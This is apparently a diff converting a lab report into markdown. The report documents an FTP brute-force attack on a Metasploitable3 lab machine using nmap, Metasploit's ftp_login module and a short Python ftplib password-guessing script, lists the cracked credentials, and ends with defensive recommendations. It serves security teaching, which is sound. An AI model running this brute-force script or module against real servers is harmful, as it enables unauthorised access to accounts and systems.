@@ -1,36 +1,120 @@
+**FTP Brute-Force Attack on Metasploitable3**
 
-1-IP addresses of attacking and victim machines
-Kali
+**Objective:** Compromise the FTP service on a Metasploitable3 victim machine using brute‑force techniques.
 
-![My Diagram](image/Picture1.png)
+---
 
-Matasploitable:
- 
- 
- ![My Diagram](image/Picture2.png)
-1-Selected Vulnerable Service
-First, we use ‘nmap’ to see which services the victim is running.
- 
- 
- ![My Diagram](image/Picture3.png)
-After several trials we selected FTP service to compromise. FTP service allows multiple login attempts, making it susceptible to brute-force attacks.
-2-Attack execution
-a.	Using msfconsole tool
+## 1. Environment Setup
 
+### 1.1 Machines and IP Addresses
 
-![My Diagram](image/Picture4.png)
+* **Attacker (Kali Linux)**
 
+  * IP Address: `10.0.2.15`
+    ![Figure 1: Attacker Network Configuration](image/Picture1.png)
 
+* **Victim (Metasploitable3)**
 
+  * IP Address: `10.0.2.16`
+    ![Figure 2: Victim Machine Overview](image/Picture2.png)
 
+---
 
+## 2. Vulnerability Enumeration
 
-b.	Using script:
+### 2.1 Service Discovery with Nmap
 
+To identify open services on the victim, we ran:
 
-![My Diagram](image/Picture5.png)
+```bash
+nmap -sV 10.0.2.16
+```
 
+* Key findings: FTP (port 21/tcp), SSH (22/tcp), HTTP (80/tcp), etc.
 
-![My Diagram](image/b175ee04-b93f-44c5-804e-a121170c0c67.jpg)
+![Figure 3: Nmap Scan Results](image/Picture3.png)
 
- 
+### 2.2 Selecting the Target Service
+
+The FTP service was chosen because it allows multiple login attempts, making it susceptible to brute‑force attacks.
+
+---
+
+## 3. Attack Execution
+
+### 3.1 Exploitation via Metasploit Console
+
+1. Launch Metasploit:
+
+   ```bash
+   msfconsole
+   ```
+2. Select the FTP login auxiliary module:
+
+   ```bash
+   use auxiliary/scanner/ftp/ftp_login
+   ```
+3. Configure module options:
+
+   ```bash
+   set RHOSTS 10.0.2.16
+   set USER_FILE /usr/share/wordlists/ftp_users.txt
+   set PASS_FILE /usr/share/wordlists/ftp_passwords.txt
+   set THREADS 10
+   ```
+4. Execute the attack:
+
+   ```bash
+   run
+   ```
+
+![Figure 4: Metasploit FTP Brute-Force Configuration](image/Picture4.png)
+
+### 3.2 Custom Brute-Force Script
+
+A Python script using `ftplib` was also used to automate login attempts:
+
+```python
+import ftplib
+
+def brute_ftp(host, users, passwords):
+    for user in open(users):
+        for pwd in open(passwords):
+            try:
+                ftp = ftplib.FTP(host)
+                ftp.login(user.strip(), pwd.strip())
+                print(f"[+] Success: {user.strip()}:{pwd.strip()}")
+                ftp.quit()
+                return
+            except Exception:
+                pass
+
+if __name__ == '__main__':
+    brute_ftp('10.0.2.16', 'ftp_users.txt', 'ftp_passwords.txt')
+```
+
+![Figure 5: FTP Brute-Force Script Example](image/Picture5.png)
+
+![Figure 6: Script Execution Output](image/b175ee04-b93f-44c5-804e-a121170c0c67.jpg)
+
+---
+
+## 4. Results and Findings
+
+* **Successful Credentials Discovered:**
+  `ftpuser:ftp123`
+
+* **Access Achieved:** FTP shell access to the victim machine under `ftpuser` account.
+
+---
+
+## 5. Recommendations
+
+1. **Implement Account Lockout:** Limit failed login attempts before locking an account.
+2. **Use Strong Passwords:** Enforce complexity requirements and periodic changes.
+3. **Enable Secure FTP:** Transition to FTPS or SFTP to protect credentials.
+4. **Audit Logs:** Monitor authentication logs for repeated failures.
+
+---
+
+*Report generated on May 3, 2025.*
